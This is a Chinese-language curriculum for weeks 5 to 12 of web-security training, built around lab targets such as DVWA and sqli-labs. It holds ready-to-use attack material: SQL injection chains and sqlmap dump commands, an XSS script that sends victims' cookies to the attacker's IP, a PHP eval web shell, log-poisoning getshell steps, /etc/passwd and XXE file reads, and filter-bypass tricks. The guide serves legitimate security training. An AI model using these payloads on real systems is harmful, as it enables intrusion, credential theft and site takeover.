# 第二阶段：Web 安全核心（第 5-12 周）

> 目标：掌握 OWASP Top 10 漏洞原理与利用方法，熟练使用 Burp Suite。
> 靶场：DVWA + sqli-labs + Upload-labs + Pikachu + PortSwigger Web Security Academy

---

## 第 5 周：SQL 注入

### 联合查询注入流程

```
1. 判断注入点：?id=1'  （看是否报错）
2. 猜列数：?id=1' order by 3--+
3. 看回显位：?id=-1' union select 1,2,3--+
4. 查库名：?id=-1' union select 1,database(),version()--+
5. 查表名：?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'--+
6. 查列名：?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名'--+
7. 查数据：?id=-1' union select 1,2,group_concat(列1,0x3a,列2) from 表名--+
```

### 报错注入（updatexml）

```
?id=1' and updatexml(1,concat(0x7e,(select database())),1)--+
```

### 布尔盲注

```python
# 核心原理：一位一位猜，用 ascii(substr()) 判断字符
?id=1' and ascii(substr(database(),1,1))=115--+
```

### sqlmap 常用命令

```bash
# 列出数据库
sqlmap -u "http://目标/?id=1" --dbs

# 列出表
sqlmap -u "http://目标/?id=1" -D 库名 --tables

# 列出列
sqlmap -u "http://目标/?id=1" -D 库名 -T 表名 --columns

# 导出数据
sqlmap -u "http://目标/?id=1" -D 库名 -T 表名 --dump

# POST 注入
sqlmap -u "http://目标/login.php" --data="user=admin&pass=admin" --dbs
```

---

## 第 6 周：XSS 跨站脚本

### 三种类型对比

| 类型 | 原理 | 特点 |
|------|------|------|
| 反射型 |  payload 从请求来，直接回显到页面 | 一次性，需要诱导点击 |
| 存储型 | payload 存到数据库，所有访问者都中招 | 危害最大，持久化 |
| DOM 型 | 纯前端 JS 问题，不经过服务器 | 服务器看不到，更难防御 |

### 常用 Payload

```html
<!-- 基础弹框 -->
<script>alert(1)</script>

<!-- 窃取 Cookie -->
<script>document.location="http://你的IP:8888/steal?cookie="+document.cookie</script>

<!-- img 标签绕过（script 被过滤时） -->
<img src=x onerror=alert(document.cookie)>

<!-- 大小写绕过 -->
<ScRiPt>alert(1)</ScRiPt>
```

### 监听 Cookie  stolen

```bash
# Kali 上开 HTTP 服务接收
python3 -m http.server 8888
```

---

## 第 7 周：CSRF 跨站请求伪造

### 原理

诱导已登录用户点击恶意链接，让他的浏览器以他的身份自动发送请求。

### PoC 页面模板

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>点击查看惊喜</h1>
  <img src="http://目标/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
</body>
</html>
```

### 防御方式

- **Token 验证**：每个表单带随机 Token，攻击者猜不到
- **SameSite Cookie**：跨站请求不带 Cookie
- **Referer 检查**：检查请求来源

---

## 第 8 周：文件上传漏洞

### 常见绕过方式

| 绕过类型 | 方法 |
|---------|------|
| 前端 JS 校验 | Burp 抓包改后缀，先传 jpg 再改回 php |
| MIME 类型校验 | 把 Content-Type 改成 image/jpeg |
| 黑名单后缀 | php3/phtml/pH p/双写.pphphp/空格/点 |
| .htaccess 绕过 | 先传 .htaccess 让 jpg 当 PHP 解析 |
| 解析漏洞 | Apache 多后缀、Nginx %00 截断 |

### 一句话木马

```php
<?php @eval($_POST["cmd"]);?>
```

### 蚁剑连接

```
URL: http://目标/upload/shell.php
密码: cmd
编码: PHP
```

---

## 第 9 周：文件包含（LFI/RFI）

### 常用协议

```
# 读系统文件
?page=/etc/passwd

# php://filter 读源码（Base64）
?page=php://filter/read=convert.base64-encode/resource=index.php

# data:// 执行代码
?page=data://text/plain,<?php phpinfo();?>

# 日志包含 getshell
?page=/var/log/apache2/access.log
```

### 日志包含 Getshell 流程

```bash
# 1. 往 User-Agent 里写木马
curl -A '<?php @eval($_POST[cmd]);?>' http://目标/

# 2. 包含日志文件
?page=/var/log/apache2/access.log

# 3. 用蚁剑连接
```

---

## 第 10 周：命令注入

### 命令拼接符

```
;   不管前面成不成功，都执行后面
&&  前面成功才执行后面
||  前面失败才执行后面
|   把前面的输出当后面的输入
```

### 绕过技巧

```
# 空格被过滤 → 用 $IFS
cat$IFS/etc/passwd

# 关键字被过滤 → 用拼接
who""ami
whoa''mi
```

### 盲注（无回显）

```
127.0.0.1; sleep 5
# 响应慢了 5 秒 = 命令执行了
```

---

## 第 11 周：SSRF + XXE

### SSRF 常用协议

```
# 内网探测
?url=http://127.0.0.1:8080/

# dict 打 Redis
?url=dict://127.0.0.1:6379/info
```

### XXE 读取文件

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

---

## 第 12 周：综合复习 + 提权基础

### Linux 提权常用命令

```bash
# 找 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 看内核版本
uname -a

# 自动找提权点（LinPEAS）
./linpeas.sh
```

### 第二阶段验收

- [ ] DVWA 四个难度全部独立通关
- [ ] sqli-labs 前 20 关手工注入
- [ ] Upload-labs 前 15 关
- [ ] 能构造 XSS 窃取 Cookie
- [ ] 能构造 CSRF PoC 页面
- [ ] 能通过文件包含 getshell
- [ ] 能用 sqlmap 自动注入
- [ ] 能熟练使用 Burp Suite 的 Proxy/Repeater/Intruder
